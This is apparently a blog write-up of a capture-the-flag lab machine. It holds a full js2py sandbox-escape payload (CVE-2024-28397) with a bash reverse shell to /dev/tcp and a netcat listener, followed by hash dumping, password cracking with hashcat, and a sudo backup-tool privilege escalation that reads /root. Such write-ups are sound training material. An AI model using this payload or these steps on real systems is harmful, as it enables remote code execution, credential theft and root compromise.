---
layout: post
title: "The Machine"
date: 2025-09-02
---

## Challenge Description
This was a cool Machine to pwn.

## Solution
Lets start by getting the needed informations to access the website:

`nmap -sC -sV 10.10.11.82`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 10:29 CEST
Nmap scan report for 10.10.11.82
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we know that for accessing through URL we have to use port `8000`. Now lets check all the directory paths:

`gobuster dir -u http://10.10.11.82:8000/ -w /path/to/common.txt`
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/download             (Status: 200) [Size: 10696]
/login                (Status: 200) [Size: 667]
/logout               (Status: 302) [Size: 189] [--> /]
/register             (Status: 200) [Size: 651]
```
After collecting the needed information for starting. I moved to the registration and login process and I looked for the cookie session. 

If we decode the cookie string in base64 we are going to see a string with `user_id` and `username`. 

`eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImFzZCJ9.aLQMdw.JLLF4tTUZH7RXRk-KWqKpZd0g0g`

`{"user_id":3,"username":"asd"}`

Meanwhile the second part of the cookie session was a mystery until I downloaded the source code from `/download`. In fact the second part is crafted by using the timestamp and the `secret_key = 'S3cr3tK3yC0d3Tw0'`. You can use the various cookies from different `user_id` to move between users and look for saved snippets of code from other players. But I arrived to the conclusion that the cookie was not the vulnerability, so i moved back to the source code. By looking at the `app.py`, there is a snippet of code regarding the `/run_code`:

```
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```
Every snippet of code that we insert through the website’s form is executed by the `js2py` function. While researching this library, I found multiple sources discussing vulnerabilities associated with it. One of the main references I relied on is the following:

https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py

I took the payload as a starting point and change it for our goal. Once ready I opened a connection with:

`nc -lvnp 9001`

And runned the payload in the editor, but be careful to character supported.

In js2py (and any real JS), you must use:
" (U+0022 quotation mark)
' (U+0027 apostrophe)
Never use:
“ ” (curly quotes from Word/editors)
‘ ’ (curly apostrophes)

```
let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.X/9001 0>&1'";
let hacked, bymarve, n11;
let getattr, obj;
hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            item(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
n11;
```

After running the payload in the form, a shell should open in the terminal where you were listening thorugh
`nc -lvnp 9001`. Once inside I moved to the `/instance` folder and dumped the content of the user table in the users.db file.

`sqlite3 users.db 'SELECT id,username,password_hash FROM user;'`

```
<rs.db 'SELECT id,username,password_hash FROM user;'
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|test|098f6bcd4621d373cade4e832627b4f6
```

I also dumped the content of `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

I used hashcat to retrive the password in order to enstablish a connection:

`hashcat -m 0 649c9d65a206a75f5abe509fe128bce5 /usr/share/wordlists/rockyou.txt`

`649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove` 

`ssh marco@10.10.11.82`
`sweetangelbabylove`

`cat user.txt`

`55c81c36193c12d8d0f2ab0c5f79875c`

And the user flag is achived!

Now lets move to the root flag!

`sudo -l`

```
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
This means that we can run the backup utility as root, without needing a password.

This execute the backup process using `/home/marco/npbackup.conf`:

`sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b -f`

```
2025-09-01 08:56:45,923 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-01 08:56:45,951 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-01 08:56:45,963 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-09-01 08:56:47,315 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-09-01 08:56:47,316 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-09-01 08:56:47,316 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-09-01 08:56:47,316 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-09-01 08:56:47,316 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-09-01 08:56:47,316 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-09-01 08:56:47,316 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-09-01 08:56:47,316 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-09-01 08:56:47,316 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
using parent snapshot 35a4dac3

Files:           0 new,     4 changed,     8 unmodified
Dirs:            0 new,     7 changed,     2 unmodified
Added to the repository: 40.053 KiB (15.687 KiB stored)

processed 12 files, 48.910 KiB in 0:00
snapshot ae5fa50d saved
2025-09-01 08:56:48,518 :: INFO :: Backend finished with success
2025-09-01 08:56:48,520 :: INFO :: Processed 48.9 KiB of data
2025-09-01 08:56:48,520 :: ERROR :: Backup is smaller than configured minmium backup size
2025-09-01 08:56:48,520 :: ERROR :: Operation finished with failure
2025-09-01 08:56:48,521 :: INFO :: Runner took 2.560583 seconds for backup
2025-09-01 08:56:48,522 :: INFO :: Operation finished
2025-09-01 08:56:48,529 :: INFO :: ExecTime = 0:00:02.608797, finished, state is: errors.
```

The `--dump` option allowed us to export what the tool thought it was backing up:

`sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /home/app/app`

Now we are going to craft our own config backup file. Lets copy the config file into a directory we can control.

`cp npbackup.conf /tmp/backup_new.conf`

```
marco@codetwo:~$ cd /tmp/
marco@codetwo:/tmp$ ls
backup_new.conf
systemd-private-b2fafc52f7b54c94872347f2e350664a-ModemManager.service-9d7Y2f
systemd-private-b2fafc52f7b54c94872347f2e350664a-systemd-logind.service-BLZrZi
systemd-private-b2fafc52f7b54c94872347f2e350664a-systemd-resolved.service-L43Ghh
systemd-private-b2fafc52f7b54c94872347f2e350664a-systemd-timesyncd.service-GxsFmj
```

Now lets modify the path:

`sudo nano backup_new.conf`

Modify this line:

```
backup_opts:
      paths:
      - /home/app/app/
```

Into this:

```
backup_opts:
      paths:
      - /root
```

By doing so we are making it point to the `/root` folder:

`sudo /usr/local/bin/npbackup-cli -c backup_new.conf -b -f`

If we try to dump it now we can see all the content of the `/root`:

`sudo /usr/local/bin/npbackup-cli -c backup_new.conf --dump /root`

In fact by reading the dump you can spot this:

```
root/root.txt0000640000000000000000000000004115055246672013566 0ustar00rootroot00000000000000762606448eb3468aedad308070481355
root/scripts/0000755000000000000000000000000015024520742013527 5ustar00rootroot00000000000000root/scripts/backup.tar.gz0000644000000000000000000052400014774376375016152 0ustar00rootroot00000000000000backups/0000700000000000000000000000000014774375025011210 5ustar  rootrootbackups/locks/0000700000000000000000000000000014774375025012323 5ustar  rootrootbackups/config0000400000000000000000000000023314774375025012376 0ustar  rootroot\xc3\xd4?\x85\xf8\xe7^.\xf9U
```

If we dump again but this time we are going to ask for the specific file we are goind to retrive the root flag:

`sudo /usr/local/bin/npbackup-cli -c backup_new.conf --dump /root/root.txt`

`762606448eb3468aedad308070481355`